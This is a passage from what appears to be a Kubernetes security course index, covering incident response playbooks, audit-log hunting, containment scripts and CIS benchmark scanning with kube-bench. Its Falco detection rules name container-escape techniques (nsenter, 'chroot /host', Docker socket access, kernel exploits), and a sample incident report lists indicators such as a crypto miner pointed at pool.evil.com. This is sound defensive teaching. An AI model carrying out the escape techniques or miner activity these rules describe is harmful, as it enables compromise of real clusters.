\"${AUDIT_LOG}\" | jq -r '\"\\(.timestamp[0:16])|\\(.user.username)\"' | \\\n  sort | uniq -c | awk '$1 &gt; 50 {print}' | head -20\n\n# 5. Multiple failed auth attempts followed by success\necho -e \"\\n[5] Brute Force Patterns:\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.responseStatus.code == 401) | .user.username' | \\\n  sort | uniq -c | awk '$1 &gt; 10 {print $2}' | \\\n  while read user; do\n    echo \"User $user had $(grep -c \"\\\"username\\\":\\\"$user\\\".*401\" ${AUDIT_LOG}) failed attempts\"\n    if grep -q \"\\\"username\\\":\\\"$user\\\".*200\" ${AUDIT_LOG}; then\n      echo \"  -&gt; Followed by successful authentication!\"\n    fi\n  done\n</code></pre>"},{"location":"12-incident-response/#4-container-breakout-detection-and-response","title":"4. Container Breakout Detection and Response","text":""},{"location":"12-incident-response/#41-common-container-breakout-techniques","title":"4.1 Common Container Breakout Techniques","text":"<p>Technique 1: Privileged Container Escape</p> <pre><code># Detection rule (Falco)\n- rule: Privileged Container Escape Attempt\n  desc: Detect attempts to escape from privileged containers\n  condition: &gt;\n    spawned_process and\n    container and\n    container.privileged = true and\n    (proc.name in (nsenter, unshare) or\n     proc.cmdline contains \"mount\" or\n     proc.cmdline contains \"chroot /host\")\n  output: &gt;\n    Potential privileged container escape\n    (process=%proc.name cmdline=%proc.cmdline\n    user=%user.name container=%container.name\n    pod=%k8s.pod.name namespace=%k8s.ns.name)\n  priority: CRITICAL\n  tags: [container_escape, privilege_escalation]\n</code></pre> <p>Technique 2: Kernel Exploit</p> <pre><code>- rule: Kernel Exploit Attempt\n  desc: Detect suspicious kernel-level activities\n  condition: &gt;\n    spawned_process and\n    (proc.name in (dirty_cow, overlayfs, runc_exploit) or\n     open_write and fd.name glob \"/proc/sys/kernel/*\" or\n     syscall.type in (ptrace, process_vm_writev))\n  output: &gt;\n    Potential kernel exploit detected\n    (process=%proc.name syscall=%syscall.type\n    file=%fd.name user=%user.name\n    container=%container.name)\n  priority: CRITICAL\n  tags: [container_escape, kernel_exploit]\n</code></pre> <p>Technique 3: Docker Socket Abuse</p> <pre><code>- rule: Docker Socket Abuse\n  desc: Detect container accessing Docker socket\n  condition: &gt;\n    open_read and\n    container and\n    fd.name = \"/var/run/docker.sock\"\n  output: &gt;\n    Container accessing Docker socket (escape risk)\n    (file=%fd.name process=%proc.name\n    container=%container.name pod=%k8s.pod.name\n    namespace=%k8s.ns.name)\n  priority: CRITICAL\n  tags: [container_escape, docker_socket]\n</code></pre>"},{"location":"12-incident-response/#42-response-playbook-for-container-breakout","title":"4.2 Response Playbook for Container Breakout","text":"<pre><code>#!/bin/bash\n# breakout-response-playbook.sh\n\nNAMESPACE=\"$1\"\nPOD_NAME=\"$2\"\n\necho \"=== Container Breakout Response Playbook ===\"\necho \"Target: ${NAMESPACE}/${POD_NAME}\"\necho \"Started: $(date)\"\n\n# Step 1: Immediate containment\necho -e \"\\n[STEP 1] IMMEDIATE CONTAINMENT\"\n\n# Isolate pod with network policy\necho \"- Creating isolation NetworkPolicy...\"\nkubectl apply -f - &lt;&lt;EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: isolate-${POD_NAME}\n  namespace: ${NAMESPACE}\nspec:\n  podSelector:\n    matchLabels:\n      pod: ${POD_NAME}\n  policyTypes:\n  - Ingress\n  - Egress\n  # Deny all traffic\nEOF\n\n# Revoke service account permissions\necho \"- Revoking service account permissions...\"\nSA_NAME=$(kubectl get pod -n \"${NAMESPACE}\" \"${POD_NAME}\" -o jsonpath='{.spec.serviceAccountName}')\nkubectl create rolebinding revoke-${SA_NAME} \\\n  --clusterrole=view \\\n  --serviceaccount=\"${NAMESPACE}:${SA_NAME}\" \\\n  -n \"${NAMESPACE}\" --dry-run=client -o yaml | kubectl apply -f -\n\n# Step 2: Evidence collection\necho -e \"\\n[STEP 2] EVIDENCE COLLECTION\"\nEVIDENCE_DIR=\"./incident/breakout-${POD_NAME}-$(date +%Y%m%d-%H%M%S)\"\nmkdir -p \"${EVIDENCE_DIR}\"\n\necho \"- Collecting pod specification...\"\nkubectl get pod -n \"${NAMESPACE}\" \"${POD_NAME}\" -o yaml &gt; \"${EVIDENCE_DIR}/pod-spec.yaml\"\n\necho \"- Collecting logs...\"\nkubectl logs -n \"${NAMESPACE}\" \"${POD_NAME}\" --all-containers=true &gt; \"${EVIDENCE_DIR}/pod-logs.txt\"\n\necho \"- Collecting events...\"\nkubectl get events -n \"${NAMESPACE}\" --field-selector involvedObject.name=\"${POD_NAME}\" &gt; \"${EVIDENCE_DIR}/events.txt\"\n\necho \"- Collecting Falco alerts...\"\nkubectl logs -n falco -l app=falco | grep \"${POD_NAME}\" &gt; \"${EVIDENCE_DIR}/falco-alerts.txt\"\n\n# Step 3: Node inspection\necho -e \"\\n[STEP 3] NODE INSPECTION\"\nNODE_NAME=$(kubectl get pod -n \"${NAMESPACE}\" \"${POD_NAME}\" -o jsonpath='{.spec.nodeName}')\necho \"- Pod running on node: ${NODE_NAME}\"\n\necho \"- Checking for other suspicious pods on same node...\"\nkubectl get pods --all-namespaces --field-selector spec.nodeName=\"${NODE_NAME}\" -o wide &gt; \"${EVIDENCE_DIR}/node-pods.txt\"\n\necho \"- Cordoning node...\"\nkubectl cordon \"${NODE_NAME}\"\n\n# Step 4: Threat assessment\necho -e \"\\n[STEP 4] THREAT ASSESSMENT\"\n\n# Check if pod has dangerous capabilities\necho \"- Checking pod capabilities...\"\nkubectl get pod -n \"${NAMESPACE}\" \"${POD_NAME}\" -o jsonpath='{.spec.containers[*].securityContext}' &gt; \"${EVIDENCE_DIR}/security-context.json\"\n\n# Check if pod is privileged\nIS_PRIVILEGED=$(kubectl get pod -n \"${NAMESPACE}\" \"${POD_NAME}\" -o jsonpath='{.spec.containers[*].securityContext.privileged}')\necho \"- Privileged: ${IS_PRIVILEGED}\"\n\n# Check for host path mounts\nHOST_MOUNTS=$(kubectl get pod -n \"${NAMESPACE}\" \"${POD_NAME}\" -o jsonpath='{.spec.volumes[?(@.hostPath)].hostPath.path}')\necho \"- Host mounts: ${HOST_MOUNTS}\"\n\n# Step 5: Eradication\necho -e \"\\n[STEP 5] ERADICATION\"\n\necho \"- Deleting compromised pod...\"\nkubectl delete pod -n \"${NAMESPACE}\" \"${POD_NAME}\" --grace-period=0 --force\n\necho \"- Checking for malicious deployments...\"\nOWNER_KIND=$(kubectl get pod -n \"${NAMESPACE}\" \"${POD_NAME}\" -o jsonpath='{.metadata.ownerReferences[0].kind}')\nOWNER_NAME=$(kubectl get pod -n \"${NAMESPACE}\" \"${POD_NAME}\" -o jsonpath='{.metadata.ownerReferences[0].name}')\n\nif [ -n \"${OWNER_NAME}\" ]; then\n  echo \"- Pod owned by ${OWNER_KIND}/${OWNER_NAME}\"\n  read -p \"Delete owner resource? (yes/no): \" DELETE_OWNER\n  if [ \"$DELETE_OWNER\" = \"yes\" ]; then\n    kubectl delete \"${OWNER_KIND}\" -n \"${NAMESPACE}\" \"${OWNER_NAME}\"\n  fi\nfi\n\n# Step 6: Recovery\necho -e \"\\n[STEP 6] RECOVERY\"\n\necho \"- Node ${NODE_NAME} remains cordoned. Manual review required before uncordoning.\"\necho \"- Review evidence in: ${EVIDENCE_DIR}\"\necho \"- Update security policies to prevent recurrence\"\n\n# Step 7: Documentation\necho -e \"\\n[STEP 7] DOCUMENTATION\"\ncat &gt; \"${EVIDENCE_DIR}/incident-summary.md\" &lt;&lt;SUMMARY\n# Container Breakout Incident Summary\n\n**Date:** $(date)\n**Affected Resource:** ${NAMESPACE}/${POD_NAME}\n**Node:** ${NODE_NAME}\n**Privileged:** ${IS_PRIVILEGED}\n**Host Mounts:** ${HOST_MOUNTS}\n\n## Timeline\n1. Breakout detected: $(date)\n2. Pod isolated with NetworkPolicy\n3. Service account permissions revoked\n4. Evidence collected\n5. Node cordoned\n6. Pod deleted\n\n## Next Steps\n- [ ] Review evidence in ${EVIDENCE_DIR}\n- [ ] Analyze Falco alerts for root cause\n- [ ] Check audit logs for attacker activity\n- [ ] Scan node for persistence mechanisms\n- [ ] Review and update admission policies\n- [ ] Uncordon node after verification\n- [ ] Update incident response playbook\n\n## Evidence Location\n${EVIDENCE_DIR}\nSUMMARY\n\necho \"=== Response Complete ===\"\necho \"Evidence: ${EVIDENCE_DIR}\"\necho \"Incident Summary: ${EVIDENCE_DIR}/incident-summary.md\"\n</code></pre>"},{"location":"12-incident-response/#5-containment-strategies","title":"5. Containment Strategies","text":""},{"location":"12-incident-response/#51-network-based-containment","title":"5.1 Network-Based Containment","text":"<p>Immediate Network Isolation:</p> <pre><code># zero-trust-isolation.yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: emergency-isolation\n  namespace: compromised-namespace\nspec:\n  podSelector:\n    matchLabels:\n      incident: active\n  policyTypes:\n  - Ingress\n  - Egress\n  # Deny all ingress and egress\n  # This completely isolates the pod\n---\n# Allow only DNS for investigation\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-dns-only\n  namespace: compromised-namespace\nspec:\n  podSelector:\n    matchLabels:\n      incident: investigation\n  policyTypes:\n  - Egress\n  egress:\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n</code></pre> <p>Progressive Containment:</p> <pre><code>#!/bin/bash\n# progressive-containment.sh\n\nNAMESPACE=\"$1\"\nLABEL_SELECTOR=\"$2\"\n\necho \"=== Progressive Containment ===\"\n\n# Level 1: Block external egress\necho \"[Level 1] Blocking external egress...\"\nkubectl apply -f - &lt;&lt;EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: block-external-egress\n  namespace: ${NAMESPACE}\nspec:\n  podSelector:\n    matchLabels:\n      ${LABEL_SELECTOR}\n  policyTypes:\n  - Egress\n  egress:\n  # Allow internal cluster traffic only\n  - to:\n    - podSelector: {}\n  - to:\n    - namespaceSelector: {}\nEOF\n\nsleep 5\n\n# Level 2: Restrict to essential services only\necho \"[Level 2] Restricting to essential services...\"\nkubectl apply -f - &lt;&lt;EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: essential-only\n  namespace: ${NAMESPACE}\nspec:\n  podSelector:\n    matchLabels:\n      ${LABEL_SELECTOR}\n  policyTypes:\n  - Egress\n  egress:\n  # DNS only\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n  # Kubernetes API only\n  - to:\n    - namespaceSelector: {}\n      podSelector:\n        matchLabels:\n          component: kube-apiserver\n    ports:\n    - protocol: TCP\n      port: 443\nEOF\n\n# Level 3: Complete isolation (if needed)\nread -p \"Proceed to complete isolation? (yes/no): \" ISOLATE\nif [ \"$ISOLATE\" = \"yes\" ]; then\n  echo \"[Level 3] Complete isolation...\"\n  kubectl apply -f - &lt;&lt;EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: complete-isolation\n  namespace: ${NAMESPACE}\nspec:\n  podSelector:\n    matchLabels:\n      ${LABEL_SELECTOR}\n  policyTypes:\n  - Ingress\n  - Egress\n  # No rules = deny all\nEOF\nfi\n\necho \"=== Containment applied ===\"\n</code></pre>"},{"location":"12-incident-response/#52-rbac-based-containment","title":"5.2 RBAC-Based Containment","text":"<p>Revoke Service Account Permissions:</p> <pre><code>#!/bin/bash\n# revoke-permissions.sh\n\nNAMESPACE=\"$1\"\nSERVICE_ACCOUNT=\"$2\"\n\necho \"=== Revoking Service Account Permissions ===\"\necho \"Target: ${NAMESPACE}/${SERVICE_ACCOUNT}\"\n\n# Backup current bindings\necho \"- Backing up current bindings...\"\nkubectl get rolebindings,clusterrolebindings -A -o yaml | \\\n  grep -A 20 \"serviceaccount.*${NAMESPACE}.*${SERVICE_ACCOUNT}\" &gt; \\\n  \"./backup-bindings-${SERVICE_ACCOUNT}-$(date +%Y%m%d-%H%M%S).yaml\"\n\n# Remove all ClusterRoleBindings\necho \"- Removing ClusterRoleBindings...\"\nkubectl get clusterrolebindings -o json | \\\n  jq -r \".items[] | select(.subjects[]? | select(.kind==\\\"ServiceAccount\\\" and .name==\\\"${SERVICE_ACCOUNT}\\\" and .namespace==\\\"${NAMESPACE}\\\")) | .metadata.name\" | \\\n  while read binding; do\n    echo \"  Deleting ClusterRoleBinding: ${binding}\"\n    kubectl delete clusterrolebinding \"${binding}\"\n  done\n\n# Remove all RoleBindings in namespace\necho \"- Removing RoleBindings in ${NAMESPACE}...\"\nkubectl get rolebindings -n \"${NAMESPACE}\" -o json | \\\n  jq -r \".items[] | select(.subjects[]? | select(.kind==\\\"ServiceAccount\\\" and .name==\\\"${SERVICE_ACCOUNT}\\\")) | .metadata.name\" | \\\n  while read binding; do\n    echo \"  Deleting RoleBinding: ${binding}\"\n    kubectl delete rolebinding -n \"${NAMESPACE}\" \"${binding}\"\n  done\n\n# Create minimal read-only binding\necho \"- Creating minimal read-only binding...\"\nkubectl create rolebinding \"${SERVICE_ACCOUNT}-restricted\" \\\n  --clusterrole=view \\\n  --serviceaccount=\"${NAMESPACE}:${SERVICE_ACCOUNT}\" \\\n  -n \"${NAMESPACE}\"\n\necho \"=== Permissions revoked successfully ===\"\necho \"Backup: ./backup-bindings-${SERVICE_ACCOUNT}-*.yaml\"\n</code></pre>"},{"location":"12-incident-response/#6-post-incident-review","title":"6. Post-Incident Review","text":""},{"location":"12-incident-response/#61-incident-report-template","title":"6.1 Incident Report Template","text":"<p><pre><code># Kubernetes Security Incident Report\n\n## Incident Overview\n- **Incident ID:** INC-YYYYMMDD-NNNN\n- **Date/Time Detected:** YYYY-MM-DD HH:MM UTC\n- **Date/Time Resolved:** YYYY-MM-DD HH:MM UTC\n- **Duration:** X hours\n- **Severity:** Critical / High / Medium / Low\n- **Status:** Closed / Open / Under Investigation\n\n## Executive Summary\n[2-3 paragraph summary of what happened, impact, and resolution]\n\n## Incident Timeline\n| Time (UTC) | Event | Actor | Notes |\n|------------|-------|-------|-------|\n| 10:15 | Falco alert triggered | Automated | Container escape attempt |\n| 10:17 | Incident declared | Security Team | P1 severity |\n| 10:20 | Pod isolated | IR Team | NetworkPolicy applied |\n| 10:25 | Evidence collected | Forensics | Logs, configs captured |\n| 10:45 | Threat eradicated | IR Team | Pod deleted, node scanned |\n| 11:30 | Services restored | Ops Team | Clean deployment |\n| 14:00 | Post-mortem | All Teams | Lessons learned |\n\n## Technical Details\n\n### Attack Vector\n[How did the attacker gain initial access?]\n\n### Exploitation Method\n[What vulnerability or misconfiguration was exploited?]\n\n### Indicators of Compromise (IOCs)\n</code></pre> - Pod: malicious-app-xyz in namespace: production - Container Image: evil/malware:v1.2.3 - Process: /tmp/xmrig --url=pool.evil.com - Network: Outbound connection to 192.0.2.100:8080 - File: /tmp/.hidden/backdoor.sh <pre><code>### Affected Systems\n- Cluster: production-us-east-1\n- Nodes: worker-01, worker-02 (cordoned)\n- Namespaces: production, staging\n- Services: api-service (downtime: 15 minutes)\n\n### Data Exposure\n[What data was accessed or exfiltrated?]\n- Customer data: NO\n- Credentials: YES (service account tokens)\n- Internal data: YES (ConfigMaps with config data)\n\n## Response Actions Taken\n\n### Containment\n1. Applied NetworkPolicy to isolate pods\n2. Revoked service account permissions\n3. Cordoned affected nodes\n4. Blocked outbound traffic to C2 server\n\n### Eradication\n1. Deleted compromised pods\n2. Scanned nodes for persistence\n3. Rotated all service account tokens\n4. Updated admission policies\n\n### Recovery\n1. Deployed clean application version\n2. Verified no persistence mechanisms\n3. Uncordoned nodes after scan\n4. Monitored for 24 hours\n\n## Root Cause Analysis\n\n### Primary Cause\n[What was the fundamental issue?]\n\nExample: Deployment used privileged container with hostPath mount to /var/run/docker.sock, allowing container escape.\n\n### Contributing Factors\n1. Admission controller not enforcing PodSecurityStandards\n2. Namespace lacked NetworkPolicies\n3. Service account had cluster-admin privileges\n4. No runtime monitoring for privileged containers\n\n### Why It Wasn't Caught Earlier\n1. Build-time image scanning didn't detect malware\n2. Manual YAML reviews didn't flag dangerous configs\n3. Runtime alerts not properly configured\n\n## Impact Assessment\n\n### Business Impact\n- Service downtime: 15 minutes\n- Customer impact: Minimal (no customer-facing services affected)\n- Data breach: No customer data exposed\n- Financial impact: $X estimated\n\n### Security Impact\n- Confidentiality: Medium (internal configs exposed)\n- Integrity: Low (no data modified)\n- Availability: Medium (brief service disruption)\n\n## Lessons Learned\n\n### What Went Well\n1. Falco detected the exploit within seconds\n2. IR playbook was effective for containment\n3. Evidence was properly preserved\n4. Team communication was excellent\n\n### What Went Wrong\n1. Privileged container should have been blocked\n2. Response could have been faster (training needed)\n3. Monitoring gaps in certain namespaces\n\n### Action Items\n\n| ID | Action | Owner | Priority | Due Date | Status |\n|----|--------|-------|----------|----------|--------|\n| 1 | Implement PodSecurityStandards=Restricted | Security | High | 2024-02-15 | Open |\n| 2 | Deploy admission controller (OPA) | Platform | High | 2024-02-20 | Open |\n| 3 | Create NetworkPolicies for all namespaces | Network | High | 2024-02-10 | In Progress |\n| 4 | Audit all service account permissions | Security | Medium | 2024-03-01 | Open |\n| 5 | Implement least-privilege RBAC | Security | Medium | 2024-03-15 | Open |\n| 6 | Improve runtime monitoring coverage | SecOps | High | 2024-02-25 | Open |\n| 7 | Conduct IR training/tabletop exercise | Security | Medium | 2024-04-01 | Open |\n\n## Recommendations\n\n### Short-term (0-30 days)\n1. Block privileged containers in production\n2. Implement NetworkPolicy defaults\n3. Rotate all secrets and tokens\n4. Update Falco rules\n\n### Medium-term (30-90 days)\n1. Implement comprehensive admission control\n2. Deploy RBAC least-privilege model\n3. Enhance monitoring and alerting\n4. Conduct security training\n\n### Long-term (90+ days)\n1. Implement zero-trust architecture\n2. Deploy service mesh for mTLS\n3. Automate compliance scanning\n4. Regular penetration testing\n\n## Appendices\n\n### Appendix A: Evidence Files\n- Pod specifications: incident-evidence/pod-specs/\n- Logs: incident-evidence/logs/\n- Forensics: incident-evidence/forensics/\n- Audit logs: incident-evidence/audit/\n\n### Appendix B: IOC List\n[Full list of indicators of compromise]\n\n### Appendix C: Remediation Scripts\n[Scripts used for containment and eradication]\n</code></pre></p>"},{"location":"12-incident-response/#summary","title":"Summary","text":"<p>This module covered:</p> <ol> <li>Incident Response Lifecycle - NIST framework applied to Kubernetes</li> <li>Forensics - Container and node evidence collection techniques</li> <li>Audit Analysis - Log analysis with jq for threat hunting</li> <li>Breakout Detection - Identifying and responding to container escapes</li> <li>Containment - Network and RBAC-based isolation strategies</li> <li>Evidence Preservation - Proper handling of forensic data</li> <li>Post-Incident Review - Lessons learned and improvement cycles</li> <li>Playbooks - Practical, executable response procedures</li> </ol>"},{"location":"12-incident-response/#hands-on-labs","title":"Hands-On Labs","text":"<ol> <li>Simulate security incident and execute IR playbook</li> <li>Practice forensic collection on running containers</li> <li>Analyze audit logs to identify attack patterns</li> <li>Respond to container breakout simulation</li> <li>Implement progressive containment strategies</li> <li>Conduct post-incident review workshop</li> <li>Create custom IR playbooks for your environment</li> </ol>"},{"location":"12-incident-response/#additional-resources","title":"Additional Resources","text":"<ul> <li>NIST SP 800-61 Rev. 2: Incident Handling Guide</li> <li>SANS Incident Handler's Handbook</li> <li>Kubernetes Audit Documentation</li> <li>Falco Response Engine</li> <li>Container Forensics Guide</li> </ul> <p>Next Module: Module 13 - CIS Benchmark and Compliance</p>"},{"location":"13-cis-compliance/","title":"Module 13: CIS Benchmark and Compliance","text":""},{"location":"13-cis-compliance/#overview","title":"Overview","text":"<p>Estimated Time: 7-8 hours</p> <p>Module Type: Compliance and Governance</p> <p>Prerequisites: - Module 02 - Control Plane Security - Module 05 - Authentication and Authorization - Module 11 - Runtime Security - Understanding of compliance frameworks (SOC 2, PCI-DSS, HIPAA) - Familiarity with infrastructure-as-code and automation</p> <p>CIS (Center for Internet Security) Kubernetes Benchmark provides consensus-driven security configuration guidelines for Kubernetes clusters. This module covers CIS Kubernetes Benchmark v1.8, automated compliance scanning with kube-bench, control plane and worker node hardening requirements, automated remediation strategies, compliance reporting, and continuous compliance monitoring. Essential for regulated industries and security-conscious organizations.</p>"},{"location":"13-cis-compliance/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Understand CIS Kubernetes Benchmark structure and scoring</li> <li>Deploy and configure kube-bench for automated scanning</li> <li>Implement control plane security requirements</li> <li>Harden worker nodes according to CIS guidelines</li> <li>Address policies and procedures sections of the benchmark</li> <li>Automate remediation with Ansible, scripts, and GitOps</li> <li>Generate compliance reports and dashboards</li> <li>Integrate compliance checks into CI/CD pipelines</li> <li>Maintain continuous compliance monitoring</li> <li>Prepare for external security audits</li> </ol>"},{"location":"13-cis-compliance/#1-cis-kubernetes-benchmark-overview","title":"1. CIS Kubernetes Benchmark Overview","text":""},{"location":"13-cis-compliance/#11-benchmark-structure","title":"1.1 Benchmark Structure","text":"<pre><code>graph TB\n    A[CIS Kubernetes Benchmark v1.8] --&gt; B[Section 1: Control Plane]\n    A --&gt; C[Section 2: etcd]\n    A --&gt; D[Section 3: Control Plane Configuration]\n    A --&gt; E[Section 4: Worker Nodes]\n    A --&gt; F[Section 5: Policies]\n\n    B --&gt; B1[1.1 Master Node Configuration Files]\n    B --&gt; B2[1.2 API Server]\n    B --&gt; B3[1.3 Controller Manager]\n    B --&gt; B4[1.4 Scheduler]\n\n    C --&gt; C1[2.1 etcd Configuration]\n    C --&gt; C2[2.2 etcd Data Encryption]\n    C --&gt; C3[2.3 etcd Access Control]\n\n    D --&gt; D1[3.1 Authentication &amp; Authorization]\n    D --&gt; D2[3.2 Logging &amp; Auditing]\n\n    E --&gt; E1[4.1 Worker Node Configuration]\n    E --&gt; E2[4.2 Kubelet]\n    E --&gt; E3[4.3 Container Runtime]\n\n    F --&gt; F1[5.1 RBAC &amp; Service Accounts]\n    F --&gt; F2[5.2 Pod Security Standards]\n    F --&gt; F3[5.3 Network Policies]\n    F --&gt; F4[5.4 Secrets Management]\n    F --&gt; F5[5.5 Extensible Admission Control]\n    F --&gt; F6[5.6 General Policies]\n\n    style A fill:#4169e1\n    style B fill:#ff6b6b\n    style C fill:#ffa500\n    style D fill:#ffff00\n    style E fill:#90ee90\n    style F fill:#9370db</code></pre>"},{"location":"13-cis-compliance/#12-scoring-methodology","title":"1.2 Scoring Methodology","text":"<p>Scoring Levels:</p> <ol> <li>Scored - Automated checks that can be verified programmatically</li> <li>Not Scored - Manual checks requiring human judgment</li> </ol> <p>Profile Levels:</p> <ol> <li>Level 1 - Practical security measures with minimal performance impact</li> <li>Suitable for most organizations</li> <li>Should be implemented by default</li> <li> <p>Provides fundamental security baseline</p> </li> <li> <p>Level 2 - Defense-in-depth measures for high-security environments</p> </li> <li>May impact performance or usability</li> <li>Recommended for security-sensitive workloads</li> <li>Requires additional operational overhead</li> </ol> <p>Recommendation Status:</p> <ul> <li>Automated - Can be verified automatically</li> <li>Manual - Requires manual verification</li> <li>Scored - Contributes to compliance score</li> <li>Not Scored - Informational only</li> </ul>"},{"location":"13-cis-compliance/#13-cis-benchmark-sections-overview","title":"1.3 CIS Benchmark Sections Overview","text":"<p>Section 1: Control Plane Components (1.1 - 1.4) - API Server security settings - Controller Manager configuration - Scheduler hardening - Configuration file permissions</p> <p>Section 2: etcd (2.1 - 2.3) - TLS configuration - Authentication and authorization - Encryption at rest - File permissions</p> <p>Section 3: Control Plane Configuration (3.1 - 3.2) - Authentication mechanisms - Authorization modes - Admission controllers - Audit logging</p> <p>Section 4: Worker Nodes (4.1 - 4.3) - Kubelet configuration - Kubelet authentication/authorization - Container runtime hardening - File permissions</p> <p>Section 5: Policies (5.1 - 5.7) - RBAC best practices - Pod Security Standards - Network segmentation - Secrets management - Admission control policies</p>"},{"location":"13-cis-compliance/#2-kube-bench-installation-and-usage","title":"2. kube-bench Installation and Usage","text":""},{"location":"13-cis-compliance/#21-installing-kube-bench","title":"2.1 Installing kube-bench","text":"<p>Method 1: Run as Kubernetes Job</p> <pre><code># kube-bench-job.yaml\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: kube-bench\n  namespace: kube-system\nspec:\n  template:\n    metadata:\n      labels:\n        app: kube-bench\n    spec:\n      hostPID: true\n      hostIPC: true\n      containers:\n      - name: kube-bench\n        image: aquasec/kube-bench:v0.7.1\n        command: [\"kube-bench\", \"run\", \"--targets\", \"master,node,etcd,policies\"]\n        volumeMounts:\n        - name: var-lib-etcd\n          mountPath: /var/lib/etcd\n          readOnly: true\n        - name: var-lib-kubelet\n          mountPath: /var/lib/kubelet\n          readOnly: true\n        - name: var-lib-kube-scheduler\n          mountPath: /var/lib/kube-scheduler\n          readOnly: true\n        - name: var-lib-kube-controller-manager\n          mountPath: /var/lib/kube-controller-manager\n          readOnly: true\n        - name: etc-systemd\n          mountPath: /etc/systemd\n          readOnly: true\n        - name: lib-systemd\n          mountPath: /lib/systemd/\n          readOnly: true\n        - name: srv-kubernetes\n          mountPath: /srv/kubernetes/\n          readOnly: true\n        - name: etc-kubernetes\n          mountPath: /etc/kubernetes\n          readOnly: true\n        - name: usr-bin\n          mountPath: /usr/local/mount-from-host/bin\n          readOnly: true\n        - name: etc-cni-netd\n          mountPath: /etc/cni/net.d/\n          readOnly: true\n        - name: opt-cni-bin\n          mountPath: /opt/cni/bin/\n          readOnly: true\n      restartPolicy: Never\n      volumes:\n      - name: var-lib-etcd\n        hostPath:\n          path: \"/var/lib/etcd\"\n      - name: var-lib-kubelet\n        hostPath:\n          path: \"/var/lib/kubelet\"\n      - name: var-lib-kube-scheduler\n        hostPath:\n          path: \"/var/lib/kube-scheduler\"\n      - name: var-lib-kube-controller-manager\n        hostPath:\n          path: \"/var/lib/kube-controller-manager\"\n      - name: etc-systemd\n        hostPath:\n          path: \"/etc/systemd\"\n      - name: lib-systemd\n        hostPath:\n          path: \"/lib/systemd\"\n      - name: srv-kubernetes\n        hostPath:\n          path: \"/srv/kubernetes\"\n      - name: etc-kubernetes\n        hostPath:\n          path: \"/etc/kubernetes\"\n      - name: usr-bin\n        hostPath:\n          path: \"/usr/bin\"\n      - name: etc-cni-netd\n        hostPath:\n          path: \"/etc/cni/net.d/\"\n      - name: opt-cni-bin\n        hostPath:\n          path: \"/opt/cni/bin/\"\n</code></pre> <p>Deploy and collect results:</p> <pre><code># Run kube-bench\nkubectl apply -f kube-bench-job.yaml\n\n# Wait for completion\nkubectl wait --for=condition=complete --timeout=300s job/kube-bench -n kube-system\n\n# Get results\nkubectl logs -n kube-system job/kube-bench &gt; kube-bench-results.txt\n\n# Parse results\necho \"=== Summary ===\"\ngrep \"\\[INFO\\]\" kube-bench-results.txt | tail -20\n</code></pre> <p>Method 2: Run Directly on Nodes</p> <pre><code>#!/bin/bash\n# run-kube-bench.sh\n\n# Download kube-bench\ncurl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.7.1/kube-bench_0.7.1_linux_amd64.tar.gz -o kube-bench.tar.gz\ntar -xvf kube-bench.tar.gz\n\n# Run on master node\nsudo ./kube-bench run --targets master --json &gt; kube-bench-master.json\n\n# Run on worker node\nsudo ./kube-bench run --targets node --json &gt; kube-bench-node.json\n\n# Run etcd checks\nsudo ./kube-bench run --targets etcd --json &gt; kube-bench-etcd.json\n\n# Generate summary report\n./kube-bench run --targets master,node,etcd --check 1.2.1,1.2.2,1.2.3 --json | \\\n  jq '.Totals'\n</code></pre>"},{"location":"13-cis-compliance/#22-continuous-compliance-scanning","title":"2.2 Continuous Compliance Scanning","text":"<p>CronJob for Regular Scanning:</p> <pre><code># kube-bench-cronjob.yaml\napiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: kube-bench-scan\n  namespace: kube-system\nspec:\n  schedule: \"0 2 * * *\"  # Daily at 2 AM\n  successfulJobsHistoryLimit: 3\n  failedJobsHistoryLimit: 3\n  jobTemplate:\n    spec:\n      template:\n        metadata:\n          labels:\n            app: kube-bench\n        spec:\n          hostPID: true\n          serviceAccountName: kube-bench\n          restartPolicy: Never\n          containers:\n          - name: kube-bench\n            image: aquasec/kube-bench:v0.7.1\n            command:\n            - sh\n            - -c\n            - |\n              kube-bench run --targets master,node,etcd,policies --json &gt; /tmp/results.json\n\n              # Upload to S3 or push to metrics system\n              SCORE=$(cat /tmp/results.json | jq '.Totals.total_pass / .Totals.total_info * 100')\n              echo \"Compliance Score: ${SCORE}%\"\n\n              # Send to Prometheus Pushgateway (if available)\n              cat &lt;&lt;EOF | curl --data-binary @- http://pushgateway:9091/metrics/job/kube-bench\n              # TYPE kube_bench_compliance_score gauge\n              kube_bench_compliance_score{cluster=\"production\"} ${SCORE}\n              EOF\n\n              # Fail if score below threshold\n              if (( $(echo \"$SCORE &lt; 80\" | bc -l) )); then\n                echo \"FAIL: Compliance score ${SCORE}% below threshold (80%)\"\n                exit 1\n              fi\n            volumeMounts:\n            - name: var-lib-etcd\n              mountPath: /var/lib/etcd\n              readOnly: true\n            - name: etc-kubernetes\n              mountPath: /etc/kubernetes\n              readOnly: true\n          volumes:\n          - name: var-lib-etcd\n            hostPath:\n              path: /var/lib/etcd\n          - name: etc-kubernetes\n            hostPath:\n              path: /etc/kubernetes\n</code></pre>"},{"location":"13-cis-compliance/#23-results-analysis-and-reporting","title":"2.3 Results Analysis and Reporting","text":"<p>Parse and Analyze Results:</p> <pre><code>#!/bin/bash\n# analyze-kube-bench.sh\n\nRESULTS_FILE=\"$1\"\n\necho \"=== CIS Kubernetes Benchmark Analysis ===\"\n\n# Overall summary\necho -e \"\\n[1] OVERALL SUMMARY:\"\ncat \"${RESULTS_FILE}\" | jq '.Totals'\n\n# Calculate compliance score\nTOTAL_PASS=$(cat 